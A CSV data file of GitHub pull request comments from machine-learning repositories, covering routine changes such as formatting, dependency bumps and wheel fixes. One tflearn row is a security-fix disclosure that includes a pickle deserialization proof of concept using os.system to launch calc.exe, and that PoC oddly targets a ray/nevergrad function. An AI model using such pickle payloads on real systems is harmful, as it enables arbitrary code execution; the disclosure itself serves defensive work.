REPO NAME,REPO OWNER,PR.NO,AUTHOR,TITLE,DATE,COMMENT,LEVEL
Probabilistic-Programming-and-Bayesian-Methods-for-Hackers,CamDavidsonPilon,528,nhkhoi91,Change trace code due to update in PyMC library,2021-07-31T14:34:51Z,,0
spaCy,explosion,8950,github-actions[bot],Auto-format code with black,2021-08-13T08:08:53Z,_This PR is auto-generated._,0
ML-From-Scratch,eriklindernoren,95,m-abdollahi,Add 4 Normalizing methods for data preprocessing and update Readme.md,2021-06-28T14:08:13Z,"Add 4 Normalizing methods (MinMaxScaler,MaxAbsScale, StandardScaler, StandardScaler with selective mean and variance) for data preprocessing including add 1 newfolder + 5 py files and update Readme.md",0
go,datasciencemasters,187,shravanthcs,test,2021-04-18T10:45:11Z,test,0
ipython,ipython,13088,martinRenou,Improve error tracebacks so that it shows the cell prompts [2] ,2021-08-12T09:57:47Z,"Follow up on this PR #13043 which adds support for SyntaxError tracebacks as well:

```python
In [1]: def foo
  In [1], line 1
    def foo
           ^
SyntaxError: invalid syntax
```",0
ipython,ipython,13088,martinRenou,Improve error tracebacks so that it shows the cell prompts [2] ,2021-08-12T10:21:14Z,cc. @MrMino,1
Virgilio,virgili0,159,wang7x,Fix a broken link in what-do-i-need-for-ml.md,2021-05-25T09:06:18Z,Fix a broken link in what-do-i-need-for-ml.md,0
dash,plotly,1711,dependabot[bot],Bump path-parse from 1.0.6 to 1.0.7 in /@plotly/eslint-config-dash,2021-08-13T01:23:06Z,"Bumps [path-parse](https://github.com/jbgutierrez/path-parse) from 1.0.6 to 1.0.7.
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/jbgutierrez/path-parse/commits/v1.0.7"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=path-parse&package-manager=npm_and_yarn&previous-version=1.0.6&new-version=1.0.7)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/plotly/dash/network/alerts).

</details>",0
ray,ray-project,17813,simon-mo,[Doc] Update macos nightly wheel names,2021-08-13T06:43:39Z,Buildkite wheels are updated to macos_10_15 instead of 13,0
gensim,RaRe-Technologies,3209,tbbharaj,Fix aarch64 wheels,2021-08-02T22:03:37Z,"This PR addresses the issue to build aarch64 wheels.
Travis build for Python 3.9 is failing because it couldn't find matching scipy distribution == 1.5.3. This issue is being addressed in this PR.

If there are any questions/comments - I'd be happy fix things as needed.

Thank you
Tanveen",0
gensim,RaRe-Technologies,3209,piskvorky,Fix aarch64 wheels,2021-08-03T07:14:59Z,"Thanks! Shouldn't these versions match `setup.py` though?

I forgot what exactly needs to be updated where, so everything's in sync… @mpenkov could you please summarize the way we update dependencies across the different files / subsystems in [Gensim & Compatibility](https://github.com/RaRe-Technologies/gensim/wiki/Gensim-And-Compatibility).",1
gensim,RaRe-Technologies,3209,tbbharaj,Fix aarch64 wheels,2021-08-10T23:35:08Z,"> Thanks! Shouldn't these versions match `setup.py` though?
> 
> I forgot what exactly needs to be updated where, so everything's in sync… @mpenkov could you please summarize the way we update dependencies across the different files / subsystems in [Gensimi & Compatibility](https://github.com/RaRe-Technologies/gensim/wiki/Gensim-And-Compatibility)

Thank you @piskvorky for reviewing my PR.
[setup.py](https://github.com/RaRe-Technologies/gensim/blob/develop/setup.py#L328) defines `'scipy >= 0.18.1'`, this should be okay with existing changes in PR isn't?

Also `scipy==1.5.3` doesn't have build for [Python 3.9](https://pypi.org/project/scipy/1.5.3/#files), therefore for Python 3.6 scipy is configured as `scipy==1.5.3` and [1.7.0 ](https://pypi.org/project/scipy/1.7.0/#files)for others which is latest",1
python-machine-learning-book,rasbt,90,AliHaider20,Update .gitignore,2020-10-16T04:50:43Z,,0
dive-into-machine-learning,hangtwenty,136,itko,Add links to browser-based tools,2021-05-16T00:46:39Z,"I added links to examples of browser-based notebooks. As someone who struggled with installing Python and Jupyter when I just got started, browser-based was a great way for me to get started without getting into the weeds of setting up my environment properly.",0
Awesome-pytorch-list,bharathgs,115,BIGBALLON,Add Distribuuu,2021-03-12T17:02:21Z,"Distribuuuu is a Distributed Classification Training Framework powered by native PyTorch.
",0
tflearn,tflearn,1163,huntr-helper,Security Fix for Arbitrary Code Execution - huntr.dev,2021-01-25T09:41:57Z,"https://huntr.dev/users/Anon-Artist has fixed the Arbitrary Code Execution vulnerability 🔨. Think you could fix a vulnerability like this?

Get involved at https://huntr.dev/

Q | A
Version Affected | ALL
Bug Fix | YES
Original Pull Request | https://github.com/418sec/tflearn/pull/1
Vulnerability README | https://github.com/418sec/huntr/blob/master/bounties/pip/tflearn/1/README.md

### User Comments:

### :bar_chart: Metadata *

TFlearn is a modular and transparent deep learning library built on top of Tensorflow. It was designed to provide a higher-level API to TensorFlow in order to facilitate and speed-up experimentations, while remaining fully transparent and compatible with it. This package was vulnerable to Arbitrary Code Execution.

#### Bounty URL: https://www.huntr.dev/bounties/1-pip-tflearn

### :gear: Description *

load_batch() function is used to load CIFAR 10 dataset for training. Lack of restriction in input allowes attacker-crafted file to get unpickled which causes code execution.

### :computer: Technical Description *

Fixed by avoiding unsafe loader.

### :bug: Proof of Concept (PoC) *

Create the following PoC file:
exploit.py

```
import pickle
import os
import nevergrad
from ray.tune.suggest.nevergrad import NevergradSearch

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())
optimizer = nevergrad.optimization.Optimizer(1)
ngSearch = NevergradSearch(optimizer)

with open('payload', 'wb') as f:
    f.write(payload)

ngSearch.restore('payload')

```

Execute the following commands in another terminal:

```
python3 exploit.py
```

    Check the Output:

xcalc will pop up.

### :fire: Proof of Fix (PoF) *

After fix it will not popup a calc.

### :+1: User Acceptance Testing (UAT)

After fix functionality is unaffected.
",0
awesome-bigdata,onurakpolat,306,zackkhan,added Hightouch to Data Ingestion section,2021-08-07T00:39:51Z,Added https://hightouch.io/ to Data Ingestion section,0
